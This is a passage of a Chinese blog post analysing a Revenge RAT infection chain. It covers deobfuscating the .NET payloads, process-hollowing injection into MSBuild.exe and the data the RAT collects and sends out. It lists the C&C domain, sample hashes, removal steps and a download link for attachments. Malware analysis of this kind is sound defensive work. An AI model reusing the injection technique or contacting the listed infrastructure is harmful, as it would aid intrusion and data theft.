+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_25.png" alt="image"></p>
+<p style="text-indent:2em">拖入反汇编工具发现，产生了好多垃圾代码，与混淆代码的变量，此时需要对该dll进行去混淆。去混淆所用到的工具是UnConfuserExTools，下面给出去混淆的步骤。</p>
+<p style="text-indent:2em">1.利用工具中的ConfuserExStringDecryptor将加密的字符串解密。</p>
+<p style="text-indent:2em">2.利用工具中的ConfuserExSwitchKiller将混淆的switch分支结构解密。</p>
+<p style="text-indent:2em">3.利用工具中的ConfuserExProxyCallFixer v2将混淆的函数名解析出来。</p>
+<p style="text-indent:2em">4.拖入de4dot去除其他混淆。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">附件工具文件名：UnConfuserExTools.rar</span><br><span class="line">附件工具文件名：de4dot.rar</span><br></pre></td></tr></table></figure>
+<p style="text-indent:2em">经过以上步骤，将解混淆的dll拖入dnspy即可看到源码。</p>
+
+<h3 id="分析PE文件1"><a href="#分析PE文件1" class="headerlink" title="分析PE文件1"></a>分析PE文件1</h3><p style="text-indent:2em">分析PE文件的第一点就是需要找到入口点函数，如果不清楚入口点函数是什么，就找上一层第一次调用了哪个函数，从这个函数入手。</p>
+<p style="text-indent:2em">追踪到上一层则是解混淆过的最后的powershell代码，返回来再次查看和分析。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_26.png" alt="image"></p>
+<p style="text-indent:2em">得到调用方法和传入的参数，开始从入口分析PE。刚开始是一些实例化对象与进程的内存操作，主要方法为FUN()，这个方法中传入了powershell的两个重要参数，一个是MSBuild.exe，一个是PE数组。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_27.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_28.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_29.png" alt="image"></p>
+<p style="text-indent:2em">进入FUN方法之后，发现调用smethod_0方法五次，根据传入的参数类型可知，主要执行代码在smethod_0()方法中。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_30.png" alt="image"></p>
+<p style="text-indent:2em">在分析这个方法的时候，首先第一眼看到方法中所用到的函数，创建进程，获取进程上下文，申请内存，写入内存，这是明显的进程注入操作的函数搭配，所以初步怀疑此方法的主要目的是将PE数组中的数据注入到进程MSBuild.exe中。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_31.png" alt="image"><br><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_32.png" alt="image"></p>
+<p style="text-indent:2em">获取PE中的区段个数，利用BlockCopy函数将区段信息拷贝到内存当中，填充傀儡进程。填充完成并启动线程，具备异常处理函数，若异常则退出。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_33.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_34.png" alt="image"></p>
+<h2 id="PE文件2"><a href="#PE文件2" class="headerlink" title="PE文件2"></a>PE文件2</h2><h3 id="PE文件2解混淆"><a href="#PE文件2解混淆" class="headerlink" title="PE文件2解混淆"></a>PE文件2解混淆</h3><p style="text-indent:2em">在C&C服务器上下载的第二个PE文件，经过查壳发现，也是.NET编译的文件，拖入dnSpy中发现还是有混淆的，这个时候不需要与PE文件1的解混淆方式一样，只需要将文件拖入de4dot去除混淆即可分析。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_35.png" alt="image"></p>
+<h3 id="分析PE文件2"><a href="#分析PE文件2" class="headerlink" title="分析PE文件2"></a>分析PE文件2</h3><p style="text-indent:2em">反编译该PE文件，进入main函数进行分析，具体代码逻辑也非常清晰，调用三个线程执行不同的逻辑，利用对象调用方法并执行，在main函数调用的主要方法中找到互斥体名称，通过查询该互斥体名称，可以得到该文件其实是一款开源的远控执行软件RevengeRAT，通过服务端的配置即可生成客户端程序，此程序则是病毒作者在服务端生成的远控程序。</p>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C&amp;C:meandmyjoggar.duckdns.org:777</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_36.png" alt="image"></p>
+<p style="text-indent:2em">接下来简单的看一下该远控程序都获取了什么样的信息，远控执行的逻辑是什么。</p>
+<p style="text-indent:2em">通过分析上传的信息，发现上传的信息有以下几种，这些信息上传之前先用base64加密。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_37.png" alt="image"></p>
+<p style="text-indent:2em">发送信息到服务端。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_38.png" alt="image"></p>
+<p style="text-indent:2em">获取硬盘驱动器信息。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_39.png" alt="image"></p>
+<p style="text-indent:2em">获取主机名称对应的IP地址。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_40.png" alt="image"></p>
+<p style="text-indent:2em">获取进程列表。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_41.png" alt="image"></p>
+<p style="text-indent:2em">通过windows安全中心获取主机上杀软信息。</p>
+
+<p><img src="https://cdn.jsdelivr.net/gh/HexLife/Picture-bed/Revenge%20RAT%20virus%20analysis%20report/Revenge%20RAT%20virus%20analysis%20report_42.png" alt="image"></p>
+<h1 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h1><table>
+<thead>
+<tr>
+<th>FileName</th>
+<th>FileSize</th>
+<th>MD5</th>
+<th>SHA1</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bit.ly/8hsshjahassahsh.js</td>
+<td>2220 bytes</td>
+<td>B76B744BDB1659E6F0357655B8A8633F</td>
+<td>27684A0EA0E12CA5C73D0345DB6EDD6B5BAA3FCB</td>
+</tr>
+<tr>
+<td>pastebin.com_raw_vXpe74L2.js</td>
+<td>45227 bytes</td>
+<td>3AC9BF50B72456EDFEEF5788E53CBA5E</td>
+<td>6F18EDF0A503C1FB94FD62DBAA4B56DB65B6C814</td>
+</tr>
+<tr>
+<td>pastebin.com_raw_wMG90xwi.ps1</td>
+<td>722851 bytes</td>
+<td>82569B99A37F27A5C29BC550E6490F28</td>
+<td>98A603BBA7709EDAE83AC5D57105CC4368C7E22D</td>
+</tr>
+<tr>
+<td>PE-1_dump.dll</td>
+<td>48128 bytes</td>
+<td>5169383F67BE4108D7ACD9910CD77BA0</td>
+<td>381DE35D0DEEF89BE920CC9BC684176301C8F178</td>
+</tr>
+<tr>
+<td>PE-2_dump.exe</td>
+<td>52224 bytes</td>
+<td>C18DDFB3F35318E6A6737B764078BC8B</td>
+<td>3C32AC7E1FE328C303EC53F96742C7CBC4CE7BDA</td>
+</tr>
+</tbody></table>
+<h1 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h1><ul>
+<li>由于病毒采用的是无文件注入模式，所以需要将注入的MSBuild.exe程序停止并删除，在正规网站下载该系统文件并替换到目录下即可。</li>
+<li>使用快捷键windows + R键，打开运行，并输入“taskschd.msc”，在计划任务中找到与C&amp;C域名相关的项，删除该计划任务项。<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p style="text-indent:2em">利用宏代码执行，所有的恶意文件均为网络上下载，这样攻击者可以随时更换攻击内容，被攻击者发现主机上没有相关的病毒文件产生。不管是宏代码还是下载下来的代码，或是下载下来的PE文件，都是经过大量混淆，所以对于简单的分析还是会遇到一些挫折。</p>
+<p style="text-indent:2em">若发现有此病毒样本的类似行为，应立即断开网络，因为样本最终是实行的远控代码，防止在C&C上获取下发的指令，之后将病毒样本保存下来，供分析者获取攻击者的信息以及攻击目的，防止之后产生同样的攻击行为，造成损失。</p>
+
+</li>
+</ul>
+<h1 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h1><ul>
+<li>附件下载地址：<ul>
+<li>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/18orkb5kXJ5QCgKP2ZvnWgQ">https://pan.baidu.com/s/18orkb5kXJ5QCgKP2ZvnWgQ</a>  提取码: 2333</li>
+</ul>
+</li>
+</ul>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/03/30/Revenge%20RAT%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">http://example.com/2021/03/30/Revenge%20RAT%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/null" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/30/MBR%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"><img class="prev-cover" src="/null" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">MBR病毒分析报告</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/30/WSH%20RAT%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"><img class="next-cover" src="/null" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">WSH RAT蠕虫病毒分析报告</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
